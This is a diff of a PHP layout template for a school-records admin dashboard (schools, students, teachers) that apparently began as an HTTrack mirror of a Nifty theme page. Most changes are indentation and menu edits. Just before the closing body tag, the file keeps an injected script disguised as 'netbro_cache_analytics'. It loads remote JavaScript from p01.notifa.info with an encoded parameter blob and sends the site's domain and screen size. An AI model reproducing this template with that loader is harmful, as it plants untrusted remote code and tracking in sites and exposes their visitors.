@@ -38,16 +38,13 @@
     <script src="<?php echo base_url(); ?>assets/plugins/pace/pace.min.js"></script>
 
 
-    <!--Demo [ DEMONSTRATION ]-->
-    <link href="<?php echo base_url(); ?>assets/css/demo/nifty-demo.min.css" rel="stylesheet">
-
     <!--Ion Icons [ OPTIONAL ]-->
-   <link href="<?php echo base_url(); ?>assets/plugins/ionicons/css/ionicons.min.css" rel="stylesheet">
+    <link href="<?php echo base_url(); ?>assets/plugins/ionicons/css/ionicons.min.css" rel="stylesheet">
 
-   <!--Morris.js [ OPTIONAL ]-->
+    <!--Morris.js [ OPTIONAL ]-->
     <link href="<?php echo base_url(); ?>assets/plugins/morris-js/morris.min.css" rel="stylesheet">
 
-   <!--Ion Icons [ OPTIONAL ]-->
+    <!--Ion Icons [ OPTIONAL ]-->
     <link href="<?php echo base_url(); ?>assets/plugins/ionicons/css/ionicons.min.css" rel="stylesheet">
 
     <!--Themify Icons [ OPTIONAL ]-->
@@ -92,17 +89,17 @@
     <!--Bootstrap Datepicker [ OPTIONAL ]-->
     <link href="<?php echo base_url(); ?>assets/plugins/bootstrap-datepicker/bootstrap-datepicker.min.css" rel="stylesheet">
 
-     <!--Unite Gallery [ OPTIONAL ]-->
+    <!--Unite Gallery [ OPTIONAL ]-->
     <link href="<?php echo base_url(); ?>assets/plugins/unitegallery/css/unitegallery.min.css" rel="stylesheet">
 
     <!--Dropzone [ OPTIONAL ]-->
     <link href="<?php echo base_url(); ?>assets/plugins/dropzone/dropzone.min.css" rel="stylesheet">
 
     <!--DataTables [ OPTIONAL ]-->
-   <link href="<?php echo base_url(); ?>assets/plugins/datatables/media/css/dataTables.bootstrap.css" rel="stylesheet">
-   <link href="<?php echo base_url(); ?>assets/plugins/datatables/extensions/Responsive/css/responsive.dataTables.min.css" rel="stylesheet">
+    <link href="<?php echo base_url(); ?>assets/plugins/datatables/media/css/dataTables.bootstrap.css" rel="stylesheet">
+    <link href="<?php echo base_url(); ?>assets/plugins/datatables/extensions/Responsive/css/responsive.dataTables.min.css" rel="stylesheet">
 
-   
+    
 
     <!--=================================================
 
@@ -137,7 +134,7 @@
 <body>
     
     <div id="container" class="effect aside-float aside-bright mainnav-lg">
-    
+        
 
         <!--NAVBAR-->
         <!--===================================================-->
@@ -242,9 +239,9 @@
                 <!--===================================================-->
                 <div id="page-content">
 
-                <?php
-                                  $this->load->view($namamodule .'/'.$namafileview);
-                                ?>
+                    <?php
+                    $this->load->view($namamodule .'/'.$namafileview);
+                    ?>
 
                 </div>
                 <!--===================================================-->
@@ -447,300 +444,304 @@
                         </a>
                         <a href="#" class="mainnav-toggle"><i class="pci-cross pci-circle icon-lg"></i></a>
                     </div>
-                    -->
+                -->
 
 
 
-                    <!--Menu-->
-                    <!--================================-->
-                    <div id="mainnav-menu-wrap">
-                        <div class="nano">
-                            <div class="nano-content">
+                <!--Menu-->
+                <!--================================-->
+                <div id="mainnav-menu-wrap">
+                    <div class="nano">
+                        <div class="nano-content">
+                            
+                            <!--Profile Widget-->
+                            <!--================================-->
+                            <div id="mainnav-profile" class="mainnav-profile">
                                 
-                                <!--Profile Widget-->
-                                <!--================================-->
-                                <div id="mainnav-profile" class="mainnav-profile">
-                                    
-                               
-                                     <div class="profile-wrap text-center">
-                                        <div class="pad-btm">
-                                            <img class="img-circle img-md" src="<?php echo base_url(); ?>assets/img/1.png" alt="Profile Picture">
-                                        </div>
-                                        <a href="#profile-nav" class="box-block" data-toggle="collapse" aria-expanded="false">
-                                            <span class="pull-right dropdown-toggle">
-                                                <i class="dropdown-caret"></i>
-                                            </span>
-                                            <p class="mnp-name">somad</p>
-                                            <span class="mnp-desc">somad@gmail.com</span>
-                                        </a>
-                                    </div>
-                               
-                               
-                                    <div id="profile-nav" class="collapse list-group bg-trans">
-                                        
-                                        <a href="<?php echo base_url('login/logoutApp'); ?>" class="list-group-item">
-                                            <i class="demo-pli-unlock icon-lg icon-fw"></i> Logout
-                                        </a>
-                                    </div>
+                             
+                               <div class="profile-wrap text-center">
+                                <div class="pad-btm">
+                                    <img class="img-circle img-md" src="<?php echo base_url(); ?>assets/img/1.png" alt="Profile Picture">
                                 </div>
-
-
-                                <!--Shortcut buttons-->
-                                <!--================================-->
-                                <div id="mainnav-shortcut" class="hidden">
-                                    <ul class="list-unstyled shortcut-wrap">
-                                        <li class="col-xs-3" data-content="My Profile">
-                                            <a class="shortcut-grid" href="#">
-                                                <div class="icon-wrap icon-wrap-sm icon-circle bg-mint">
-                                                <i class="demo-pli-male"></i>
-                                                </div>
-                                            </a>
-                                        </li>
-                                        <li class="col-xs-3" data-content="Messages">
-                                            <a class="shortcut-grid" href="#">
-                                                <div class="icon-wrap icon-wrap-sm icon-circle bg-warning">
-                                                <i class="demo-pli-speech-bubble-3"></i>
-                                                </div>
-                                            </a>
-                                        </li>
-                                        <li class="col-xs-3" data-content="Activity">
-                                            <a class="shortcut-grid" href="#">
-                                                <div class="icon-wrap icon-wrap-sm icon-circle bg-success">
-                                                <i class="demo-pli-thunder"></i>
-                                                </div>
-                                            </a>
-                                        </li>
-                                        <li class="col-xs-3" data-content="Lock Screen">
-                                            <a class="shortcut-grid" href="#">
-                                                <div class="icon-wrap icon-wrap-sm icon-circle bg-purple">
-                                                <i class="demo-pli-lock-2"></i>
-                                                </div>
-                                            </a>
-                                        </li>
-                                    </ul>
-                                </div>
-                                <!--================================-->
-                                <!--End shortcut buttons-->
-
+                                <a href="#profile-nav" class="box-block" data-toggle="collapse" aria-expanded="false">
+                                    <span class="pull-right dropdown-toggle">
+                                        <i class="dropdown-caret"></i>
+                                    </span>
+                                    <p class="mnp-name">somad</p>
+                                    <span class="mnp-desc">somad@gmail.com</span>
+                                </a>
+                            </div>
+                            
+                            
+                            <div id="profile-nav" class="collapse list-group bg-trans">
                                 
-
-                                 
-                                <ul id="mainnav-menu" class="list-group">
-              
-                                    <?php if($this->uri->segment('1') == 'data_sekolah'){ ?>
-                                    <li class="active-sub">
-                                        <a href="<?php echo base_url('data_sekolah'); ?>">
-                                            <i class="fa fa-list"></i>
-                                            <span class="menu-title">Data Sekolah</span>
-                                            <i class="arrow"></i>
-                                        </a>
-                                        <!--Submenu-->
-                                    </li>
-                                    <?php } else{ ?>
-                                        <li>
-                                        <a href="<?php echo base_url('data_sekolah'); ?>">
-                                            <i class="fa fa-list"></i>
-                                            <span class="menu-title">Data Sekolah</span>
-                                            <i class="arrow"></i>
-                                        </a>
-                                        <!--Submenu-->
-                                    </li>
-                                    <?php } ?>
-                                    
-                                    <?php if($this->uri->segment('1') == 'data_siswa'){ ?>
-                                    <li class="active-sub">
-                                        <a href="<?php echo base_url('data_siswa'); ?>">
-                                            <i class="fa fa-list"></i>
-                                            <span class="menu-title">Data Siswa</span>
-                                            <i class="arrow"></i>
-                                        </a>
-                                        <!--Submenu-->
-                                    </li>
-                                    <?php } else{ ?>
-                                        <li>
-                                        <a href="<?php echo base_url('data_siswa'); ?>">
-                                            <i class="fa fa-list"></i>
-                                            <span class="menu-title">Data siswa</span>
-                                            <i class="arrow"></i>
-                                        </a>
-                                        <!--Submenu-->
-                                    </li>
-                                    <?php } ?>
-
-                                    <?php if($this->uri->segment('1') == 'data_guru'){ ?>
-                                    <li class="active-sub">
-                                        <a href="<?php echo base_url('data_guru'); ?>">
-                                            <i class="fa fa-list"></i>
-                                            <span class="menu-title">Data Guru</span>
-                                            <i class="arrow"></i>
-                                        </a>
-                                        <!--Submenu-->
-                                    </li>
-                                    <?php } else{ ?>
-                                        <li>
-                                        <a href="<?php echo base_url('data_guru'); ?>">
-                                            <i class="fa fa-list"></i>
-                                            <span class="menu-title">Data Guru</span>
-                                            <i class="arrow"></i>
-                                        </a>
-                                        <!--Submenu-->
-                                    </li>
-                                    <?php } ?>
-
-
-                              
-                                    </ul>
-                                
-
-                                <!--Widget-->
-                                <!--================================-->
-
-                                <!--================================-->
-                                <!--End widget-->
-
+                                <a href="<?php echo base_url('login/logoutApp'); ?>" class="list-group-item">
+                                    <i class="demo-pli-unlock icon-lg icon-fw"></i> Logout
+                                </a>
                             </div>
                         </div>
-                    </div>
-                    <!--================================-->
-                    <!--End menu-->
 
+
+                        <!--Shortcut buttons-->
+                        <!--================================-->
+                        <div id="mainnav-shortcut" class="hidden">
+                            <ul class="list-unstyled shortcut-wrap">
+                                <li class="col-xs-3" data-content="My Profile">
+                                    <a class="shortcut-grid" href="#">
+                                        <div class="icon-wrap icon-wrap-sm icon-circle bg-mint">
+                                            <i class="demo-pli-male"></i>
+                                        </div>
+                                    </a>
+                                </li>
+                                <li class="col-xs-3" data-content="Messages">
+                                    <a class="shortcut-grid" href="#">
+                                        <div class="icon-wrap icon-wrap-sm icon-circle bg-warning">
+                                            <i class="demo-pli-speech-bubble-3"></i>
+                                        </div>
+                                    </a>
+                                </li>
+                                <li class="col-xs-3" data-content="Activity">
+                                    <a class="shortcut-grid" href="#">
+                                        <div class="icon-wrap icon-wrap-sm icon-circle bg-success">
+                                            <i class="demo-pli-thunder"></i>
+                                        </div>
+                                    </a>
+                                </li>
+                                <li class="col-xs-3" data-content="Lock Screen">
+                                    <a class="shortcut-grid" href="#">
+                                        <div class="icon-wrap icon-wrap-sm icon-circle bg-purple">
+                                            <i class="demo-pli-lock-2"></i>
+                                        </div>
+                                    </a>
+                                </li>
+                            </ul>
+                        </div>
+                        <!--================================-->
+                        <!--End shortcut buttons-->
+
+                        
+
+                        
+                        <ul id="mainnav-menu" class="list-group">
+                          
+                            <?php if($this->uri->segment('1') == 'data_sekolah'){ ?>
+                                <li class="active-sub">
+                                    <a href="<?php echo base_url('data_sekolah'); ?>">
+                                        <i class="fa fa-list"></i>
+                                        <span class="menu-title">Data Sekolah</span>
+                                        <i class="arrow"></i>
+                                    </a>
+                                    <!--Submenu-->
+                                </li>
+                            <?php } else{ ?>
+                                <li>
+                                    <a href="<?php echo base_url('data_sekolah'); ?>">
+                                        <i class="fa fa-list"></i>
+                                        <span class="menu-title">Data Sekolah</span>
+                                        <i class="arrow"></i>
+                                    </a>
+                                    <!--Submenu-->
+                                </li>
+                            <?php } ?>
+                            
+                            <?php if($this->uri->segment('1') == 'data_siswa'){ ?>
+                                <li class="active-sub">
+                                    <a href="<?php echo base_url('data_siswa'); ?>">
+                                        <i class="demo-pli-receipt-4"></i>
+                                        <span class="menu-title">Data</span>
+                                        <i class="arrow"></i>
+                                    </a>
+                                    <ul class="collapse in">
+                                        <li class="active-link"><a href="data-siswa.html">Data Siswa</a></li>
+                                        <li><a href="data-user.html">Data User</a></li>
+                                    </ul>
+                                    <!--Submenu-->
+                                </li>
+                            <?php } else{ ?>
+                                <li>
+                                    <a href="<?php echo base_url('data_siswa'); ?>">
+                                        <i class="fa fa-list"></i>
+                                        <span class="menu-title">Data Siswa</span>
+                                        <i class="arrow"></i>
+                                    </a>
+                                    <!--Submenu-->
+                                </li>
+                            <?php } ?>
+
+                            <?php if($this->uri->segment('1') == 'data_guru'){ ?>
+                                <li class="active-sub">
+                                    <a href="<?php echo base_url('data_guru'); ?>">
+                                        <i class="fa fa-list"></i>
+                                        <span class="menu-title">Data Guru</span>
+                                        <i class="arrow"></i>
+                                    </a>
+                                    <!--Submenu-->
+                                </li>
+                            <?php } else{ ?>
+                                <li>
+                                    <a href="<?php echo base_url('data_guru'); ?>">
+                                        <i class="fa fa-list"></i>
+                                        <span class="menu-title">Data Guru</span>
+                                        <i class="arrow"></i>
+                                    </a>
+                                    <!--Submenu-->
+                                </li>
+                            <?php } ?>
+
+
+                            
+                        </ul>
+                        
+
+                        <!--Widget-->
+                        <!--================================-->
+
+                        <!--================================-->
+                        <!--End widget-->
+
+                    </div>
                 </div>
-            </nav>
-            <!--===================================================-->
-            <!--END MAIN NAVIGATION-->
+            </div>
+            <!--================================-->
+            <!--End menu-->
 
         </div>
+    </nav>
+    <!--===================================================-->
+    <!--END MAIN NAVIGATION-->
+
+</div>
 
 
 
-        <!-- FOOTER -->
-        <!--===================================================-->
-        <footer id="footer">
+<!-- FOOTER -->
+<!--===================================================-->
+<footer id="footer">
 
-            <!-- Visible when footer positions are fixed -->
-            <!-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ -->
-            <div class="show-fixed pad-rgt pull-right">
-                You have <a href="#" class="text-main"><span class="badge badge-danger">3</span> pending action.</a>
-            </div>
-
-
-
-            <!-- Visible when footer positions are static -->
-            <!-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ -->
-            <div class="hide-fixed pull-right pad-rgt">
-               Hummasoft Technologhy
-            </div>
-
-
-
-            <!-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ -->
-            <!-- Remove the class "show-fixed" and "hide-fixed" to make the content always appears. -->
-            <!-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ -->
-
-            <p class="pad-lft">&#0169; 2019 HummaPOS</p>
-
-
-
-        </footer>
-        <!--===================================================-->
-        <!-- END FOOTER -->
-
-
-        <!-- SCROLL PAGE BUTTON -->
-        <!--===================================================-->
-        <button class="scroll-top btn">
-            <i class="pci-chevron chevron-up"></i>
-        </button>
-        <!--===================================================-->
+    <!-- Visible when footer positions are fixed -->
+    <!-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ -->
+    <div class="show-fixed pad-rgt pull-right">
+        You have <a href="#" class="text-main"><span class="badge badge-danger">3</span> pending action.</a>
     </div>
-    <!--===================================================-->
-    <!-- END OF CONTAINER -->
+
+
+
+    <!-- Visible when footer positions are static -->
+    <!-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ -->
+    <div class="hide-fixed pull-right pad-rgt">
+     Hummasoft Technologhy
+ </div>
+
+
+
+ <!-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ -->
+ <!-- Remove the class "show-fixed" and "hide-fixed" to make the content always appears. -->
+ <!-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ -->
+
+ <p class="pad-lft">&#0169; 2019 HummaPOS</p>
+
+
+
+</footer>
+<!--===================================================-->
+<!-- END FOOTER -->
+
+
+<!-- SCROLL PAGE BUTTON -->
+<!--===================================================-->
+<button class="scroll-top btn">
+    <i class="pci-chevron chevron-up"></i>
+</button>
+<!--===================================================-->
+</div>
+<!--===================================================-->
+<!-- END OF CONTAINER -->
 
 
 
 
 
-    <!--JAVASCRIPT-->
-    <!--=================================================-->
+<!--JAVASCRIPT-->
+<!--=================================================-->
 
-    <!--jQuery [ REQUIRED ]-->
-    <script src="<?php echo base_url(); ?>assets/js/jquery.min.js"></script>
-
-
-    <!--BootstrapJS [ RECOMMENDED ]-->
-    <script src="<?php echo base_url(); ?>assets/js/bootstrap.min.js"></script>
+<!--jQuery [ REQUIRED ]-->
+<script src="<?php echo base_url(); ?>assets/js/jquery.min.js"></script>
 
 
-    <!--NiftyJS [ RECOMMENDED ]-->
-    <script src="<?php echo base_url(); ?>assets/js/nifty.min.js"></script>
+<!--BootstrapJS [ RECOMMENDED ]-->
+<script src="<?php echo base_url(); ?>assets/js/bootstrap.min.js"></script>
 
 
-
-
-    <!--=================================================-->
-
-    <!--Bootstrap Select [ OPTIONAL ]-->
-    <script src="<?php echo base_url(); ?>assets/plugins/bootstrap-select/bootstrap-select.min.js"></script>
-
-     <!--FooTable [ OPTIONAL ]-->
-   <script src="<?php echo base_url(); ?>assets/plugins/fooTable/dist/footable.all.min.js"></script>
-
-    <!--Chosen [ OPTIONAL ]-->
-    <script src="<?php echo base_url(); ?>assets/plugins/chosen/chosen.jquery.min.js"></script>
-
-
-    <!--Bootstrap Tags Input [ OPTIONAL ]-->
-    <script src="<?php echo base_url(); ?>assets/plugins/bootstrap-tagsinput/bootstrap-tagsinput.min.js"></script>
-
-
-    <!--noUiSlider [ OPTIONAL ]-->
-    <script src="<?php echo base_url(); ?>assets/plugins/noUiSlider/nouislider.min.js"></script>
-
-    <!--sweetalert -->
-    <script src="<?php echo base_url(); ?>assets/sweetalert/sweetalert.min.js"></script>
-
-    <!--Select2 [ OPTIONAL ]-->
-    <script src="<?php echo base_url(); ?>assets/plugins/select2/js/select2.min.js"></script>
-
-
-    <!--Bootstrap Timepicker [ OPTIONAL ]-->
-    <script src="<?php echo base_url(); ?>assets/plugins/bootstrap-timepicker/bootstrap-timepicker.min.js"></script>
-
-     <!--Demo script [ DEMONSTRATION ]-->
-    <script src="<?php echo base_url(); ?>assets/js/demo/nifty-demo.min.js"></script>
-
-
-    <!--Unite Gallery [ OPTIONAL ]-->
-    <script src="<?php echo base_url(); ?>assets/plugins/unitegallery/js/unitegallery.min.js"></script>
-    <script src="<?php echo base_url(); ?>assets/plugins/unitegallery/themes/tilesgrid/ug-theme-tilesgrid.js"></script>
-
-
-    <!--Bootstrap Datepicker [ OPTIONAL ]-->
-    <script src="<?php echo base_url(); ?>assets/plugins/bootstrap-datepicker/bootstrap-datepicker.min.js"></script>
-
-    <!--DataTables [ OPTIONAL ]-->
-    <script src="<?php echo base_url(); ?>assets/plugins/datatables/media/js/jquery.dataTables.js"></script>
-	  <script src="<?php echo base_url(); ?>assets/plugins/datatables/media/js/dataTables.bootstrap.js"></script>
-	  <script src="<?php echo base_url(); ?>assets/plugins/datatables/extensions/Responsive/js/dataTables.responsive.min.js"></script>
-
-    <!--DataTables Sample [ SAMPLE ]-->
-    <script src="<?php echo base_url(); ?>assets/js/demo/tables-datatables.js"></script>
-
-    <!--Bootbox Modals [ OPTIONAL ]-->
-    <script src="<?php echo base_url(); ?>assets/plugins/bootbox/bootbox.min.js"></script>
-
-   <!--Dropzone [ OPTIONAL ]-->
-   <script src="<?php echo base_url(); ?>assets/plugins/dropzone/dropzone.min.js"></script>
-
-   <!--Form File Upload [ SAMPLE ]-->
-   <script src="<?php echo base_url(); ?>assets/js/demo/form-file-upload.js"></script>
+<!--NiftyJS [ RECOMMENDED ]-->
+<script src="<?php echo base_url(); ?>assets/js/nifty.min.js"></script>
 
 
 
-    <!--Custom script [ DEMONSTRATION ]-->
-    <!--===================================================-->
-    <script>
-        $(document).on('nifty.ready', function () {
+
+<!--=================================================-->
+
+<!--Bootstrap Select [ OPTIONAL ]-->
+<script src="<?php echo base_url(); ?>assets/plugins/bootstrap-select/bootstrap-select.min.js"></script>
+
+<!--FooTable [ OPTIONAL ]-->
+<script src="<?php echo base_url(); ?>assets/plugins/fooTable/dist/footable.all.min.js"></script>
+
+<!--Chosen [ OPTIONAL ]-->
+<script src="<?php echo base_url(); ?>assets/plugins/chosen/chosen.jquery.min.js"></script>
+
+
+<!--Bootstrap Tags Input [ OPTIONAL ]-->
+<script src="<?php echo base_url(); ?>assets/plugins/bootstrap-tagsinput/bootstrap-tagsinput.min.js"></script>
+
+
+<!--noUiSlider [ OPTIONAL ]-->
+<script src="<?php echo base_url(); ?>assets/plugins/noUiSlider/nouislider.min.js"></script>
+
+<!--sweetalert -->
+<script src="<?php echo base_url(); ?>assets/sweetalert/sweetalert.min.js"></script>
+
+<!--Select2 [ OPTIONAL ]-->
+<script src="<?php echo base_url(); ?>assets/plugins/select2/js/select2.min.js"></script>
+
+
+<!--Bootstrap Timepicker [ OPTIONAL ]-->
+<script src="<?php echo base_url(); ?>assets/plugins/bootstrap-timepicker/bootstrap-timepicker.min.js"></script>
+
+<!--Demo script [ DEMONSTRATION ]-->
+<script src="<?php echo base_url(); ?>assets/js/demo/nifty-demo.min.js"></script>
+
+
+<!--Unite Gallery [ OPTIONAL ]-->
+<script src="<?php echo base_url(); ?>assets/plugins/unitegallery/js/unitegallery.min.js"></script>
+<script src="<?php echo base_url(); ?>assets/plugins/unitegallery/themes/tilesgrid/ug-theme-tilesgrid.js"></script>
+
+
+<!--Bootstrap Datepicker [ OPTIONAL ]-->
+<script src="<?php echo base_url(); ?>assets/plugins/bootstrap-datepicker/bootstrap-datepicker.min.js"></script>
+
+<!--DataTables [ OPTIONAL ]-->
+<script src="<?php echo base_url(); ?>assets/plugins/datatables/media/js/jquery.dataTables.js"></script>
+<script src="<?php echo base_url(); ?>assets/plugins/datatables/media/js/dataTables.bootstrap.js"></script>
+<script src="<?php echo base_url(); ?>assets/plugins/datatables/extensions/Responsive/js/dataTables.responsive.min.js"></script>
+
+<!--DataTables Sample [ SAMPLE ]-->
+<script src="<?php echo base_url(); ?>assets/js/demo/tables-datatables.js"></script>
+
+<!--Bootbox Modals [ OPTIONAL ]-->
+<script src="<?php echo base_url(); ?>assets/plugins/bootbox/bootbox.min.js"></script>
+
+<!--Dropzone [ OPTIONAL ]-->
+<script src="<?php echo base_url(); ?>assets/plugins/dropzone/dropzone.min.js"></script>
+
+<!--Form File Upload [ SAMPLE ]-->
+<script src="<?php echo base_url(); ?>assets/js/demo/form-file-upload.js"></script>
+
+
+
+<!--Custom script [ DEMONSTRATION ]-->
+<!--===================================================-->
+<script>
+    $(document).on('nifty.ready', function () {
 
           // CHOSEN
           // =================================================================
@@ -751,24 +752,24 @@
           $('#demo-cs-multiselect').chosen({width:'100%'});
 
 
-            $("#demo-gallery").unitegallery({
-                tile_enable_shadow: false
-            });
-
-
-
-            $("#demo-gallery-2").unitegallery({
-                tile_enable_shadow: false,
-                theme_navigation_type: "arrows"
-            });
-
-
+          $("#demo-gallery").unitegallery({
+            tile_enable_shadow: false
         });
-    </script>
 
 
 
-<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2iBChPrGIbjUWZGox9%2fkr1uHmXNbfFg7iJOq73iY3i9gjH9B8F6qFTmSGdnl0kBm3BNGJPd79CpSqmKdOldL4Lu50Hn49J2brJwmSxWfFx4YdGvcMgzTyfs6TV%2f9cEwJA1GnwM2lUY2KeR6Bj3EuJpywq4D5Xnnu%2bbXVIvSThIVQxX0k1aXe%2bGfDAY%2bpblkqIj39dPFBatFcNr7XTMOcYd6vHNeGC%2bi6qI%2f5pUQApaUb6CofqnO3p8lqtdTdsxBWHSjdX83R6JO%2fXHSrajuiBRB1%2b27pKFR4o%2bAwM%2fW4bbNHYLPvYs5U7c0PouWCZ7Zdgp1e0P%2bp0yzc3FJUvqkJEZIpq3UMkK%2bWsHyA4PYef8KQAkZOP%2fA2nXl7F7AsdBuQgqgQULGqYmIDEbW3UQyk%2f%2f1%2bFf4OIcyXEM1kWvmMf1Y8MiID9GVZzmmTDrmJ80xdJ7d2PIhnPueKVj2gRPzW8qw7288lLys5cJhFSvzLvPCbRC3VXXtTW%2bw%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+          $("#demo-gallery-2").unitegallery({
+            tile_enable_shadow: false,
+            theme_navigation_type: "arrows"
+        });
 
-<!-- Mirrored from www.themeon.net/nifty/v2.9.1/gallery-grid.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 02 Feb 2019 04:11:28 GMT -->
-</html>
+
+      });
+  </script>
+
+
+
+  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2iBChPrGIbjUWZGox9%2fkr1uHmXNbfFg7iJOq73iY3i9gjH9B8F6qFTmSGdnl0kBm3BNGJPd79CpSqmKdOldL4Lu50Hn49J2brJwmSxWfFx4YdGvcMgzTyfs6TV%2f9cEwJA1GnwM2lUY2KeR6Bj3EuJpywq4D5Xnnu%2bbXVIvSThIVQxX0k1aXe%2bGfDAY%2bpblkqIj39dPFBatFcNr7XTMOcYd6vHNeGC%2bi6qI%2f5pUQApaUb6CofqnO3p8lqtdTdsxBWHSjdX83R6JO%2fXHSrajuiBRB1%2b27pKFR4o%2bAwM%2fW4bbNHYLPvYs5U7c0PouWCZ7Zdgp1e0P%2bp0yzc3FJUvqkJEZIpq3UMkK%2bWsHyA4PYef8KQAkZOP%2fA2nXl7F7AsdBuQgqgQULGqYmIDEbW3UQyk%2f%2f1%2bFf4OIcyXEM1kWvmMf1Y8MiID9GVZzmmTDrmJ80xdJ7d2PIhnPueKVj2gRPzW8qw7288lLys5cJhFSvzLvPCbRC3VXXtTW%2bw%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+
+  <!-- Mirrored from www.themeon.net/nifty/v2.9.1/gallery-grid.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 02 Feb 2019 04:11:28 GMT -->
+  </html>
